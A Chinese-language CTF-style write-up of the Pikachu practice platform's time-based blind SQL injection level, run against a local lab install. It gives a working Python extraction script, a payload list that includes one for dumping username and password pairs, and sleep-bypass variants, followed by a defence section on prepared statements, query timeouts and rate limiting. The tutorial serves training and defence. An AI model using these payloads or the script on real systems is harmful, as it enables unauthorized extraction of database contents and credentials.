---
layout: post
title: Pikachu - SQL注入 盲注(base on time) Writeup（靠耗时判断真假）
platform: pikachu
date: 2026-10-28 22:43:00 +0800
categories: CTF
---

Pikachu - SQL注入 盲注(base on time) Writeup（靠耗时判断真假）

一、题目信息

- 平台：Pikachu 漏洞练习平台（本地搭建）
- 模块：SQL-Inject → 盲注(base on time)
- 地址：`http://localhost/pikachu/vul/sqli/sqli_blind_t.php`
- 题型：Web
- 考点：**时间盲注**、`sleep()`、噪音基线与阈值

**环境信息**：

```text
phpStudy 8.1.1.3（D:\phpstudy_pro）
Apache 2.4.39 + MySQL 5.7.26 + PHP 7.3.4nts
数据库：pikachu / root / root
```

**页面形态**：

```text
what's your username?

[ 文本框            ]  [ 查询 ]

i don't care who you are!
```

**✅ 实测结果**

**信号验证（页面内容完全一样）**：

| 输入 | 耗时 | 页面长度 | 内容 |
|---|---|---|---|
| `vince`（真）| 0.04s | 33262 | `i don't care who you are!` |
| `zzz`（假）| 0.01s | 33262 | `i don't care who you are!` |

**★ 内容、大小完全相同 → 只能靠时间区分。**

**sleep 验证**：

| 输入 | 实测耗时 | 判断 |
|---|---|---|
| `vince' and sleep(2) #` | **2.03s** | sleep 生效 |
| `vince' and if(ascii(substr(database(),1,1))>110, sleep(2), 0) #` | **2.04s** | 真 |
| `vince' and if(ascii(substr(database(),1,1))>120, sleep(2), 0) #` | **0.03s** | 假 |

**噪音基线（各 10 次）**：

```text
假条件（不 sleep）：0.008 ~ 0.033 秒   平均 0.021s
真条件（sleep 0.4）：0.419 ~ 0.453 秒   平均 0.430s
空隙：0.386 秒   →  阈值取 0.226 秒最安全
```

**⚠️ 一次真实的误判（sleep 太小）**：

```text
sleep(0.4) 时：
    库名 = pikachu          (7 字符, 11.6s)  ✅
    版本 = 5                (1 字符, 2.5s)   ❌ 应为 5.7.26
    用户 = root@localhost   (14 字符, 24.7s) ✅
总请求 171 次，总耗时 38.9 秒

sleep(1.0) 重测 version()：
    length(version())=1..11 逐个测 → 只有 =6 为真
    version() = 5.7.26      (50 次请求, 18.0 秒)  ✅
```

**性能对比**：

```text
布尔盲注：库名 7 字符 → 1.5 秒
时间盲注：库名 7 字符 → 11.6 秒（sleep 0.4）
全量 840 请求：布尔 24.3 秒  vs  时间约 390 秒（6.5 分钟）
```

二、题目分析

**① 关键代码：两个分支输出一模一样**

```php
<?php
// sqli_blind_t.php 第 26-43 行
if(isset($_GET['submit']) && $_GET['name'] != null){
    $name = $_GET['name'];
    $query = "select id,email from member where username='$name'";
    $result = mysqli_query($link, $query);       // 不打印报错

    if($result && mysqli_num_rows($result)==1){
        while($data = mysqli_fetch_assoc($result)){
            ...
            //这里不管输入啥,返回的都是一样的信息,所以更加不好判断
            $html .= "<p class='notice'>i don't care who you are!</p>";    // ★ 真
        }
    }else{
        $html .= "<p class='notice'>i don't care who you are!</p>";        // ★ 假
    }
}
?>
```

**★ 和上一关（布尔盲注）的唯一区别**：

```php
// 上一关
if 分支 → "your uid:1 / your email is: vince@..."   ← 能看到区别
else    → "您输入的username不存在"

// 这一关
if 分支 → "i don't care who you are!"              ← ★ 一模一样
else    → "i don't care who you are!"              ← ★ 一模一样
```

**★ 作者的注释写得很直白**：

```
"这里不管输入啥,返回的都是一样的信息,所以更加不好判断"
```

**★ 实测确认"完全无法区分"**：

```
vince（真）  耗时 0.04s   页面长度 33262
zzz（假）    耗时 0.01s   页面长度 33262
                          └────┬────┘
                      页面内容、大小完全相同
```

**★ 所以唯一的信号是：响应时间。**

**② 核心技术：`if(条件, sleep(N), 0)`**

**三个函数配合**：

```sql
if(cond, a, b)       -- 条件为真返回 a，否则返回 b
sleep(N)             -- 让数据库暂停 N 秒（可以带小数）
and                  -- 把条件接到原查询后面
```

**组合起来**：

```sql
vince' and if( ascii(substr(database(),1,1)) > 110 , sleep(1), 0 ) #
```

**逻辑**：

```
条件为真 → 执行 sleep(1) → 响应慢 1 秒
条件为假 → 返回 0        → 立刻响应

★ 用"耗时"这一个 bit 判断真假
★ 这就是时间盲注的全部信息来源
```

**★ 为什么用 `if()` 而不是逻辑短路？**

```sql
-- 理论上可以这样（依赖短路）
vince' and (条件) and sleep(1) #

-- 但 MySQL 不保证求值顺序
-- 有时会把 sleep(1) 提前执行 → 无论真假都延时 → 失效

★ 所以 if() 是最可靠的方式
```

**③ sleep 会"每行执行一次"**

**★ 这个细节很有意思**：

```sql
select id,email from member where username='vince' and sleep(2)
```

```
WHERE 条件对【每一行】都要求值：
    第 1 行（vince）→ id 匹配 → 还要评估 sleep(2) → 等 2 秒 → 为真 → 选中
    第 2~7 行 → id 不匹配 → 但因为 and，仍要评估 sleep(2)？

★ 实测：vince' and sleep(2) # → 2.03 秒
★ 只有 1 次延时 → 说明 MySQL 对不匹配的行"短路"了（id 条件先评估）
```

**★ 但如果是 `or`**：

```sql
select ... where username='vince' or sleep(2)
```

```
第 1 行：'vince' 为真 → or 的右边不评估 → 0 秒
（但 MySQL 实际会对每行都评估）
```

**★ 在 delete 那关我们实测过**：

```
delete from message where id=1 or sleep(2)
→ 表有 3 行 → 实测 6 秒
★ 3 行 × 2 秒 = 6 秒

★ 这个特性可以用来"数表里有多少行"
```

**④ 时间盲注的最大问题：噪音导致误判**

**★ 我第一次跑完整提取时就翻车了**：

```python
# 用 sleep(0.4)，阈值 0.25 秒
get_str("select database()", "库名")     # → pikachu          ✅ 11.6s
get_str("select version()", "版本")      # → "5"              ❌ 只读到 1 个字符！
get_str("select user()", "用户")         # → root@localhost   ✅ 24.7s
```

**★ 为什么 `version()` 只读到 "5"？**

```
get_len() 逐个问 length(version())=1, =2, =3...
问 =1 时，响应耗时 0.3 秒（网络抖动 / 页面渲染慢）
超过阈值 0.25 → 误判为"真" → 返回长度 1
→ 只读 1 个字符 → "5"（version() 首字符）

★ 实际 version() = "5.7.26"，长度是 6
★ 一次误判，整个结果就错了
```

**★ 用 `sleep(1.0)` 重测，就对了**：

```text
length(version())=1  → 假
length(version())=2  → 假
length(version())=3  → 假
length(version())=4  → 假
length(version())=5  → 假
length(version())=6  → ★ 真
length(version())=7  → 假
...
length(version())=11 → 假

version() = 5.7.26    （50 次请求，18.0 秒）
```

**★ 这个坑非常有教育意义**：

```
时间盲注的准确率取决于：
    ① sleep 时长（越大越准，但越慢）
    ② 网络稳定性
    ③ 阈值选择

★ 所以时间盲注必须"先测噪音基线"
```

**⑤ 噪音基线：阈值该怎么选（最重要的一步）**

**★ 假条件 10 次（不 sleep）**：

```text
0.032  0.020  0.033  0.009  0.031  0.020  0.009  0.008  0.026  0.020
最小 0.008s   最大 0.033s   平均 0.021s
```

**★ 真条件 10 次（sleep 0.4）**：

```text
0.431  0.419  0.435  0.421  0.434  0.453  0.435  0.422  0.436  0.419
最小 0.419s   最大 0.453s   平均 0.430s
```

**★ 结论**：

```text
假：0.008 ~ 0.033 秒
真：0.419 ~ 0.453 秒
空隙：0.386 秒
→ 阈值取空隙正中：0.226 秒最安全
```

**★ 但注意**：

```
理论空隙 0.386 秒看着很安全
实际却出现了 0.3 秒的抖动（偶发的页面渲染慢）

★ 所以"理论阈值"不等于"实际可靠"
★ 建议把 sleep 设到 ≥1 秒，空隙就到了 1 秒以上
```

三、解题步骤

**第 1 步：确认"完全看不出区别"**

```text
① 打开 http://localhost/pikachu/vul/sqli/sqli_blind_t.php
② 输入：vince → 看到 "i don't care who you are!"
③ 输入：zzz   → 也看到 "i don't care who you are!"
```

**★ 页面内容、HTML 长度完全一样 —— 这就是"盲"到极致。**

**第 2 步：⭐ 用 F12 网络面板"看时间"**

```text
① F12 → 【网络】(Network)
② 清空现有记录（🚫 图标）
③ 输入：vince' and sleep(3) #
④ 点查询
⑤ 看那条请求的"时间"列 → 3.0x 秒
```

**★ 再试条件延时**：

```
⑥ 输入：vince' and if(1=1, sleep(3), 0) #   → 3 秒（真）
⑦ 输入：vince' and if(1=2, sleep(3), 0) #   → 0.0x 秒（假）
```

**★ 第 ⑥⑦ 步的耗时差异，就是时间盲注的全部信息来源。**

**第 3 步：⭐ 手动读一个字符**

**先探库名长度**：

```
vince' and if(length(database())=7, sleep(3), 0) #
→ 3 秒 = 真（库名长度是 7）
```

**再探第一个字符（二分）**：

```
vince' and if(ascii(substr(database(),1,1))>110, sleep(3), 0) #
→ 3 秒 = 真（首字符 ASCII > 110）

vince' and if(ascii(substr(database(),1,1))>120, sleep(3), 0) #
→ 立刻返回 = 假（首字符 ASCII ≤ 120）

vince' and if(ascii(substr(database(),1,1))=112, sleep(3), 0) #
→ 3 秒 = 真
→ ASCII 112 = 'p' → 库名首字母 p
```

**★ 每个字符手动大概要试 6-7 次，每次 3 秒 → 一个字符 20 秒。**

**★ 所以必须要脚本。**

**第 4 步：手动测噪音（专业做法）**

```sql
-- 假条件，观察基线（多刷几次，看 F12 的时间抖动）
vince' and if(1=2, sleep(1), 0) #

-- 真条件
vince' and if(1=1, sleep(1), 0) #
```

**★ 如果"假"有时也花 0.3 秒，说明网络抖动大 → sleep 要加大。**

**第 5 步：跑脚本（完整代码）**

```python
# blind_time.py
import time
import urllib.request
import urllib.parse

BASE = "http://localhost/pikachu/vul/sqli/sqli_blind_t.php"
SLEEP = 1.0        # 真值延时（秒）
THRESH = 0.6       # 阈值：超过 0.6 秒算"真"

def yes(sql):
    """用'耗时'判断真假"""
    payload = "vince' and if((%s), sleep(%s), 0) #" % (sql, SLEEP)
    url = BASE + "?" + urllib.parse.urlencode({"name": payload, "submit": "查询"})
    t0 = time.time()
    with urllib.request.urlopen(
        urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"}), timeout=60
    ) as r:
        r.read()
    return (time.time() - t0) >= THRESH      # ★ 关键：靠时间判断

def get_len(expr):
    for i in range(1, 60):
        if yes("length((%s)) = %d" % (expr, i)):
            return i
    return 0

def get_char(expr, pos):
    lo, hi = 32, 127
    while lo < hi:
        mid = (lo + hi) // 2
        if yes("ascii(substr((%s),%d,1)) > %d" % (expr, pos, mid)):
            lo = mid + 1
        else:
            hi = mid
    return chr(lo)

def get_str(expr, label):
    n = get_len(expr)
    s = "".join(get_char(expr, i) for i in range(1, n + 1))
    print("  %-8s = %s" % (label, s))
    return s

get_str("select database()", "库名")
get_str("select user()", "用户")
```

**★ 实测输出**：

```
库名      = pikachu                      (7 字符, 11.6s)
用户      = root@localhost               (14 字符, 24.7s)
总请求 171 次，总耗时 38.9 秒
```

**第 6 步：提高准确率（重要）**

**★ 方法 1：加大 sleep**

```python
SLEEP = 1.5      # 慢一点，但更准
THRESH = 1.0
```

**★ 方法 2：重复验证**

```python
def yes(sql, retry=2):
    """同一个问题问 retry 次，全为真才算真"""
    for _ in range(retry):
        if not _ask_once(sql):
            return False
    return True
```

**★ 方法 3：边界重试**

```python
def get_char(expr, pos):
    lo, hi = 32, 127
    while lo < hi:
        mid = (lo + hi) // 2
        # 二分时对同一个 >mid 问题问两次，一致才采纳
        r1 = yes("ascii(substr((%s),%d,1)) > %d" % (expr, pos, mid))
        # 如果这次答案很"贴边"，再问一次
        if r1: lo = mid + 1
        else:  hi = mid
    return chr(lo)
```

**第 7 步：完整 payload 汇总**

```sql
-- ① 确认 sleep 生效
vince' and sleep(3) #

-- ② 条件延时（真/假）
vince' and if(1=1, sleep(3), 0) #
vince' and if(1=2, sleep(3), 0) #

-- ③ 探长度
vince' and if(length(database())=7, sleep(1), 0) #

-- ④ 探字符（二分）
vince' and if(ascii(substr(database(),1,1))>110, sleep(1), 0) #

-- ⑤ 读表名
vince' and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))>110, sleep(1), 0) #

-- ⑥ 读账号
vince' and if(ascii(substr((select group_concat(concat(username,':',password)) from users),1,1))>110, sleep(1), 0) #
```

四、延伸知识

**① 三种盲注的完整对比**

| 类型 | 信号 | 前提 | 速度（库名 7 字符）|
|---|---|---|---|
| 报错注入 | 报错信息 | 报错会显示 | 毫秒级 |
| **布尔盲注** | 页面内容差异 | 有"两种可见状态" | **1.5 秒** |
| **时间盲注** | **响应时间** | 完全无差异 | **11.6 秒** |

**★ 优先级**：

```
① 有报错 → 报错注入（最快）
② 有真假 → 布尔盲注（快）
③ 什么都没有 → 时间盲注（慢 13~30 倍）
```

**★ 本关就是"什么都没有"的极端情况**：

```
· mysqli_query 不打印错误
· 两个分支输出完全一样
· 唯一的信息：响应时间
```

**② `sleep` 的三个"变体"（sleep 被禁时用）**

**变体 1：`benchmark()`（消耗 CPU）**

```sql
vince' and if(条件, benchmark(10000000, md5('a')), 0) #
```

**★ `benchmark(n, expr)` 把 expr 执行 n 次。**

**★ 优点**：不依赖 sleep（有些环境禁用了 sleep 函数）。  
**★ 缺点**：时间不精确，取决于机器性能。

**变体 2：大表笛卡尔积**

```sql
vince' and if(条件, (select count(*) from information_schema.columns a, information_schema.columns b), 0) #
```

**★ 让数据库做几百万次计算 → 天然延时。**

**★ 优点**：绕过 `sleep` 关键字黑名单。

**变体 3：正则回溯爆炸**

```sql
vince' and if(条件, rlike('^(a+)+$', repeat('a', 1000)), 0) #
```

**★ 老技巧，现代 MySQL 已有防护。**

**③ 时间盲注的"提速"技巧**

**技巧 1：一次判断多个字符（位运算）**

```sql
-- 一次问 7 个字符的"第一个 bit"
vince' and if(
    ascii(substr(database(),1,1)) & 1 = 1,
    sleep(1), 0
) #
```

**★ 原理**：每个字符的 ASCII 是 7-8 个 bit。

```
逐个字符（二分）：7 次请求/字符
按 bit 问：       7 次请求/字符  ← 并没有更快

★ 实际上二分法更优（一次砍一半 vs 一次拿一个 bit）
```

**技巧 2：`group_concat` 一次问多行**（同布尔盲注）

```sql
-- 5 张表用 1 次字符串提取
select group_concat(table_name) from information_schema.tables where table_schema=database()
```

**★ 这是最有效的"提速"手段**：

```
不用：5 张表 × (长度 + 每字符 7 次) 
用：  1 个 38 字符的字符串 × (1 + 38×7)
```

**技巧 3：`if(... , sleep(N), 0)` 里 N 用小数**

```sql
sleep(0.3)      -- 如果网络够稳，能快 3 倍
```

**★ 但要注意噪音（本关我实测 sleep(0.4) 就误判了）。**

**④ 一个"反向利用"：用 sleep 数行数**

**★ 前面 delete 那关我们见过**：

```sql
delete from message where id=1 or sleep(2)
→ 表有 3 行 → 6 秒
```

**★ 同样的技巧可以用来"数表里有多少行"**：

```sql
vince' and if((select count(*) from users) > 2, sleep(1), 0) #
```

**★ 或者直接用延时量判断**：

```sql
vince' and sleep((select count(*) from users)) #
→ 3 个用户 → 3 秒
```

**★ 这是个很巧妙的用法 —— 把"计数"编码进"时间"里。**

**⑤ 真实场景：什么时候会遇到时间盲注**

**场景 1：完全无回显的 API**

```
POST /api/check_user
{"username": "vince"}
→ 200 OK / 404 Not Found
→ 但响应时间会因 sleep 而变
```

**场景 2：登录接口（只提示"登录失败"）**

```php
if ($row) { header("Location: /dashboard"); }
else { echo "用户名或密码错误"; }
```

**★ 其实这里可以做布尔盲注（状态码/跳转不同）—— 但如果连跳转都被统一处理了，就只能时间盲注。**

**场景 3：后台任务 / 异步接口**

```
提交任务后返回 task_id
→ 无法判断执行结果
→ 但若注入点在 SQL 里，sleep 会让任务变慢
```

**⑥ 防御**

**★ 本关的漏洞代码**：

```php
$query = "select id,email from member where username='$name'";
$result = mysqli_query($link, $query);
```

**✅ 预处理（根本解决）**：

```php
$stmt = $link->prepare("select id,email from member where username=?");
$stmt->bind_param('s', $name);
$stmt->execute();
```

**★ 用了预处理，时间盲注也打不了**：

```
and if(..., sleep(1), 0) 会被当成"一个叫这个名字的用户"
→ 查不到 → 固定响应 → 没有时间差
```

**✅ 辅助防御 1：`max_execution_time`（很实用）**

```php
$link->query("SET SESSION max_execution_time = 1000");   // 1 秒超时
```

**★ 效果**：

```
攻击者的 sleep(3) 会被 MySQL 在 1 秒时打断
→ 返回错误 → 时间差消失
→ 时间盲注失效
```

**✅ 辅助防御 2：限流**

```php
if (too_many_requests($_SERVER['REMOTE_ADDR'])) {
    exit("请求太频繁，请稍后再试");
}
```

**★ 时间盲注需要几百次请求，限流能有效阻断。**

**✅ 辅助防御 3：监控慢查询**

```sql
-- 开启慢查询日志，阈值设 0.5 秒
SET GLOBAL slow_query_log = ON;
SET GLOBAL long_query_time = 0.5;

★ 如果日志里出现大量耗时 1 秒的相同查询 → 有人在盲注
```

**⑦ 一个完整的"盲注流程图"**

```
开始
 │
 ├─ 试 ' → 页面报错？
 │      ├─ 是 → 报错注入（extractvalue）
 │      └─ 否 ↓
 │
 ├─ 试 ' and 1=1  /  ' and 1=2
 │      ├─ 页面不同 → 布尔盲注
 │      └─ 页面相同 ↓
 │
 ├─ 试 ' and sleep(2)
 │      ├─ 耗时明显增加 → 时间盲注
 │      └─ 无变化 → 可能无注入 / 或有 WAF
 │
 └─ 确定类型后 → 二分法提取
```

五、总结

- **本题核心：页面两个分支输出完全相同，唯一信号是"响应时间" → 用 `if(条件, sleep(N), 0)` 制造时间差。**

- **一行漏洞代码 + 两个一样的输出**：

```php
if($result && mysqli_num_rows($result)==1){
    $html .= "i don't care who you are!";      // 真
}else{
    $html .= "i don't care who you are!";      // 假（完全一样）
}
```

- **⭐ 七个必记要点**：

```text
① 时间盲注是"最后的办法"
   有报错 → 报错注入
   有真假 → 布尔盲注
   啥都没有 → 时间盲注（慢 13~30 倍）

② 核心 payload
   vince' and if(条件, sleep(N), 0) #
   ★ 用 if() 而不是逻辑短路（MySQL 不保证求值顺序）

③ 先测"噪音基线"
   假条件跑 10 次看最大耗时
   真条件跑 10 次看最小耗时
   阈值 = 两者空隙的中点
   ★ 两者重叠 → 加大 sleep

④ 一次误判 = 整个字符串错
   我实测 sleep(0.4) 时 length() 误判
   → version() 只读到 "5"
   → sleep(1.0) 才稳定

⑤ sleep 会"每行执行一次"
   and sleep(2) → 匹配 1 行 → 2 秒
   or 1=1 + sleep(2) → 7 行 → 14 秒
   ★ 可以反过来"数行数"

⑥ 预处理能防住
   参数一旦被绑定，"条件"就只是数据 → 没有时间差

⑦ max_execution_time 是有效防御
   设 1 秒超时 → 攻击者的 sleep(3) 被打断
```

- **实测数据**：

```text
【信号验证】
    vince（真）  0.04s   页面长度 33262
    zzz（假）    0.01s   页面长度 33262      ← 内容完全相同

    vince' and sleep(2) #                                          → 2.03s
    vince' and if(ascii(substr(database(),1,1))>110, sleep(2), 0) # → 2.04s（真）
    vince' and if(ascii(substr(database(),1,1))>120, sleep(2), 0) # → 0.03s（假）

【噪音基线】
    假条件 10 次：0.008 ~ 0.033 秒（平均 0.021）
    真条件 10 次（sleep 0.4）：0.419 ~ 0.453 秒（平均 0.430）
    空隙 0.386 秒 → 阈值取 0.226 秒

【一次真实误判】
    sleep(0.4) 时：
        库名 = pikachu        (7 字符, 11.6s)  ✅
        版本 = 5              (1 字符, 2.5s)   ❌ 应为 5.7.26
        用户 = root@localhost (14 字符, 24.7s) ✅

    sleep(1.0) 重测：
        length(version())=1..11 逐个测 → 只有 =6 为真
        version() = 5.7.26    (50 次请求, 18.0 秒)  ✅

【性能对比】
    布尔盲注：库名 7 字符 → 1.5 秒
    时间盲注：库名 7 字符 → 11.6 秒（sleep 0.4）
    全量 840 请求：布尔 24.3 秒 vs 时间约 390 秒（6.5 分钟）
```

- **SQL-Inject 模块进度**：

```text
✅ 数字型注入(post)       —— UNION
✅ 字符型注入(get)        —— 闭合 ' + UNION
✅ 搜索型注入             —— 闭合 '%'
✅ xx型注入               —— 闭合 ')'
✅ "insert/update"注入    —— 写操作 + 报错注入
✅ "delete"注入           —— 删数据 + 时间盲注
✅ "http header"注入      —— 请求头 + 数据搬迁
✅ 盲注(base on boolean)  —— 布尔通道 + 二分法
✅ 盲注(base on time)     —— 本题：靠耗时判断
⬜ 宽字节注入             —— 最后一关（GBK 绕过）
```

**手工复现要点**：

```text
· 输入 vince / zzz → 页面完全一样（"i don't care who you are!"）
· F12 网络面板 → 输入 vince' and sleep(3) # → 请求耗时 3 秒
· 输入 vince' and if(1=1, sleep(3), 0) # → 3 秒
· 输入 vince' and if(1=2, sleep(3), 0) # → 0.0x 秒
· 输入 vince' and if(length(database())=7, sleep(3), 0) # → 3 秒（真）
· 输入 vince' and if(ascii(substr(database(),1,1))>110, sleep(3), 0) # → 3 秒
· 跑 blind_time.py → 38 秒拿到库名、用户、版本
```

**一句话记忆**：

```
┌────────────────────────────────────────────────────────────┐
│  时间盲注 = 页面看不出来时的"最后一张牌"                       │
│                                                            │
│  payload：vince' and if(条件, sleep(N), 0) #                │
│     真 → 响应慢 N 秒                                        │
│     假 → 立刻返回                                           │
│                                                            │
│  ★ 一定要先测"噪音基线"，再定阈值                              │
│  ★ sleep 太小会误判（我实测 sleep 0.4 时 version 只读到 "5"）   │
│  ★ 慢：全量提取要 6.5 分钟（布尔盲注 24 秒）                    │
│                                                            │
│  优先级：报错注入 > 布尔盲注 > 时间盲注                         │
│  防御：预处理 + max_execution_time + 限流                     │
└────────────────────────────────────────────────────────────┘
```
